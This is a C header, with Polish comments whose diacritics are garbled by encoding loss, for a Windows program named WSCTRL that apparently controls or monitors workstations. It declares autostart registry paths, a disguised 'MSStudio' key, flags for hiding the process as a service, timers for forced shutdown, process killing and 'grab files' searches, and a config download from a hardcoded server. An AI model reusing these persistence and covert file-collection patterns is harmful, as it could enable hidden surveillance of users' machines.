///////////////////////////////////////////////////////////////////////////////
#include <windows.h>
#include <commctrl.h>
#include <tlhelp32.h>
#include <lmcons.h>
#include <tchar.h>
#include <process.h>
#include <wininet.h>
#include "resource.h"
///////////////////////////////////////////////////////////////////////////////
#define ID_TIMER_TIME_TO_SHUTDOWN	1		// Identyfikator licznika g��wnego
#define TIME_TO_SHUTDOWN_INTERVAL	56565	// Interwa� licznika g��wnego

#define ID_TIMER_SHUTDOWN_PROC		2		// Identyfikator licznika zamykania systemu
#define SHUTDOWN_PROC_INTERVAL		1000	// Interwa� licznika zamykania systemu

#define ID_TIMER_FLASHWINDOW		3		// Identyfikator licznika migania okna
#define FLASHWINDOW_INTERVAL		667		// Interwa� licznika migania okna

#define ID_TIMER_CONTROLPROCESSES	4		// Identyfikator licznika uruchomionych proces�w
#define CONTROLPROCESSES_INTERVAL	67890	// Interwa� licznika uruchomionych proces�w

#define ID_TIMER_GRABFILES			5		// Identyfikator licznika przeszukiwania systemu plik�w
#define GRABFILES_INTERVAL			123456	// Interwa� licznika przeszukiwania systemu plik�w

#define SOUND_FREQUENCY				400		// Cz�stotliwo�� dzwi�ku
#define SOUND_DELAY					200		// D�ugo�� przerwy w odtwarzaniu dzwi�ku

#define MAX_VALUE_NAME				255		// 

#define MAX_INFO					64		// 

#define WM_WSASELECTEVENT			WM_USER+1

#define REG_VALUE_WSCTRL			TEXT("WSCTRL") // Nazwa programu
///////////////////////////////////////////////////////////////////////////////
// Sta�e definiuj�ce �cie�ki w rejestrze
#define REG_PATH_MSSTUDIO			TEXT("Software\\MSStudio")
#define REG_PATH_WSCTRL				REG_PATH_MSSTUDIO WSCTRL
#define REG_PATH_CURRENTVERSION		TEXT("Software\\Microsoft\\Windows\\CurrentVersion")
#define REG_PATH_RUN				REG_PATH_CURRENTVERSION TEXT("\\Run")
#define REG_PATH_RUNONCE			REG_PATH_CURRENTVERSION TEXT("\\RunOnce")
#define REG_PATH_RUNONCEEX			REG_PATH_CURRENTVERSION TEXT("\\RunOnceEx")
#define REG_PATH_RUNSERVICES		REG_PATH_CURRENTVERSION TEXT("\\RunServices")
#define REG_PATH_RUNSERVICESONCE	REG_PATH_CURRENTVERSION TEXT("\\RunServicesOnce")
///////////////////////////////////////////////////////////////////////////////
// �cie�ki zawieraj�ce informacje do �ci�gni�cia
#define	PCTSTR_REMOTESERVER			TEXT("192.168.16.73")
#define	PCTSTR_HTTPWSCTRLCONFIG		TEXT("http://") PCTSTR_REMOTESERVER TEXT("/wsctrl.ini")
#define	PCTSTR_WSCTRLREMOTEDIR		TEXT("\\\\") PCTSTR_REMOTESERVER TEXT("\\") REG_VALUE_WSCTRL TEXT("$\\")
///////////////////////////////////////////////////////////////////////////////
#define	RSP_REGISTER_SERVICE		0x00000001	// Registers the process as a service process.
#define	RSP_UNREGISTER_SERVICE		0x00000000	// Unregisters the process as a service process.
///////////////////////////////////////////////////////////////////////////////
// Sta�e dotycz�ce przeszukiwania systemu plik�w
//#define MAX_SPYPATHS		2
//#define MAX_SPYFILTERS		6
///////////////////////////////////////////////////////////////////////////////
//
//#define	fTest				0	// 0 - Wersja ko�cowa; 1 - Wersja testowa
///////////////////////////////////////////////////////////////////////////////
//	Deklaracje zmiennych globalnych
WIN32_FIND_DATA fd;
OSVERSIONINFOEX osvi;
div_t		div_result;

SYSTEMTIME	stShutdownTime,
			stCurrentTime;
FILETIME	ftSourceLastWriteTime,
			ftDestLastWriteTime;

HANDLE		hFile,
			hSourceFile,
			hDestFile;
HINSTANCE	hInst;
HKEY		hKey;

//TCHAR	szSpyPath[MAX_PATH];
//TCHAR	szGrabPath[MAX_PATH];

TCHAR	szEstimatedTimeToShutdown[16];

TCHAR	szUserName[UNLEN + CNLEN + 2];
TCHAR	szComputerName[UNLEN + CNLEN + 2];

TCHAR	szKillProcessArray[1024];
TCHAR	szKillProcess[MAX_PATH];
TCHAR	szServer[MAX_PATH];

TCHAR	szSourcePath[MAX_PATH];
TCHAR	szTargetPath[MAX_PATH];
TCHAR	szDestPath[MAX_PATH];
TCHAR	szWinInitPath[MAX_PATH];			// �cie�ka do pliku 'wininit.ini'
TCHAR	szWSCtrlSourcePath[MAX_PATH];
TCHAR	szWSCtrlTargetPath[MAX_PATH];
TCHAR	szWSCtrlDestPath[MAX_PATH];
TCHAR	szConfigPath[MAX_PATH];
///////////////////////////////////////////////////////////////////////////////
//	Deklaracje zmiennych globalnych
BOOL	SetDlgItemFont(HWND, int, PTSTR, BYTE, BOOL, BOOL, BOOL);
void 	_Beep(WORD, DWORD);
void	_Delay(DWORD);
BOOL	HttpDownloadFile(HINTERNET, LPCTSTR, LPCTSTR, BOOL);
void	WSAClose();
int		WSAStartupServer(HWND);
void	WSASelectEvent(HWND, UINT, WPARAM, LPARAM);
///////////////////////////////////////////////////////////////////////////////